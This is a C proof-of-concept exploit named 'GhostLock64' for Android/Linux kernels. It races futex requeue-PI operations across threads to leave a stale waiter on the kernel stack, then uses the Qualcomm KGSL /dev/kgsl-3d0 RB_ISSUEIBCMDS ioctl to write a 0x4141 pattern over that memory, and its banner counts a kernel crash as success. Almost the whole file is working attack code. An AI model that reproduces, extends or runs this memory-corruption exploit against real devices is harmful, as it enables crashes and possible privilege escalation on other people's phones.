/**
 * ghostlock64.c — 64-bit GhostLock + KGSL RB_ISSUEIBCMDS test
 *
 * 64-bit process: no compat wrapper, CFU 32B @ SP+0x08
 * If CFU overlaps with stale waiter → KERNEL CRASH
 */
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <pthread.h>
#include <errno.h>
#include <string.h>
#include <time.h>
#include <stdint.h>

static uint32_t f_wait      __attribute__((aligned(4096)));
static uint32_t f_pi_target __attribute__((aligned(4096)));
static uint32_t f_pi_chain  __attribute__((aligned(4096)));
static volatile int ready, owner_ok, kgsl_done;

static long futex(uint32_t *u, int op, uint32_t val, void *to, uint32_t *u2, uint32_t v3) {
    return syscall(SYS_futex, u, op, val, to, u2, v3);
}

#define IOC(nr,sz) (((uint32_t)3<<30)|(((uint32_t)(sz))<<16)|(((uint32_t)0x09)<<8)|((uint32_t)(nr)))

static void *waiter(void *a) {
    (void)a;
    futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
    printf("[waiter] pi_chain locked\n");
    ready = 1; while (!owner_ok) usleep(1000);

    struct timespec ts; clock_gettime(CLOCK_MONOTONIC, &ts); ts.tv_sec += 8;
    long r = futex(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target, 0);
    printf("[waiter] WAIT_REQUEUE_PI: ret=%ld errno=%d\n", r, errno);
    printf("[waiter] ⚠️  Stale waiter on stack!\n");

    /* ── KGSL 64-bit native ── */
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    printf("[kgsl] fd=%d\n", fd);
    if (fd < 0) goto out;

    /* Create context */
    struct { uint32_t f; uint32_t id; } ctx = {0x12, 0};
    errno = 0; r = ioctl(fd, IOC(0x13, 0x08), &ctx);
    printf("[kgsl] CREATE: ret=%d id=%u\n", (int)r, ctx.id);
    if (r < 0) goto out;

    /* CRASH PATTERN ibdesc */
    struct { uint64_t ga; uint64_t sw; } ib = {
        0x0ULL,
        0x4141414141414141ULL  /* CRASH IF OVERLAPS WAITER */
    };

    /* 64-bit native RB_ISSUEIBCMDS struct (32 bytes)
     * This worked in test_ib_flags from 64-bit */
    struct {
        uint32_t drawctxt_id; uint32_t flags;
        uint64_t ibdesc_addr;
        uint32_t numibs; uint32_t pad1;
        uint32_t timestamp; uint32_t pad2;
    } cmd = {
        .drawctxt_id = ctx.id,
        .flags = 0,
        .ibdesc_addr = (uint64_t)(uintptr_t)&ib,
        .numibs = 1,
        .timestamp = 0,
    };

    printf("[kgsl] ═══════════════════════════════\n");
    printf("[kgsl]  64-bit CFU with CRASH PATTERN\n");
    printf("[kgsl]  ibdesc: ga=0x%016llx sw=0x%016llx\n",
           (unsigned long long)ib.ga, (unsigned long long)ib.sw);
    printf("[kgsl] ═══════════════════════════════\n");

    errno = 0;
    r = ioctl(fd, IOC(0x10, 0x20), &cmd);
    printf("[kgsl] ISSUEIBCMDS(64): ret=%d errno=%d\n", (int)r, errno);
    if (r == 0)
        printf("[kgsl] ⚠️  CFU FIRED! Check kernel...\n");

    ioctl(fd, IOC(0x14, 0x04), &ctx.id);
out:
    if (fd >= 0) close(fd);
    futex(&f_pi_chain, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
    kgsl_done = 1;
    return 0;
}

static void *owner(void *a) {
    (void)a;
    futex(&f_pi_target, FUTEX_LOCK_PI, 0, 0, 0, 0);
    printf("[owner] pi_target locked\n");
    owner_ok = 1; while (!ready) usleep(1000);
    usleep(500000);
    futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
    printf("[owner] pi_chain locked\n");
    while (!kgsl_done) sleep(1);
    return 0;
}

int main(void) {
    printf("╔══════════════════════════════════════╗\n");
    printf("║  GhostLock64 + KGSL CFU TEST        ║\n");
    printf("║  ⚠️  KERNEL CRASH = SUCCESS         ║\n");
    printf("╚══════════════════════════════════════╝\n\n");

    f_wait=0; f_pi_target=0; f_pi_chain=0;

    pthread_t wt, ot;
    pthread_create(&wt, 0, waiter, 0);
    usleep(200000);
    pthread_create(&ot, 0, owner, 0);
    usleep(300000);

    printf("[trigger] FUTEX_CMP_REQUEUE_PI...\n");
    for (int i = 0; i < 100; i++) {
        long r = futex(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void*)1, &f_pi_target, 0);
        if (r >= 0) { printf("[trigger] ✅ GhostLock! ret=%ld\n\n", r); break; }
        usleep(1000);
    }

    while (!kgsl_done) sleep(1);
    pthread_join(wt, 0); pthread_join(ot, 0);
    printf("\n=== KERNEL SURVIVED ===\n");
    return 0;
}
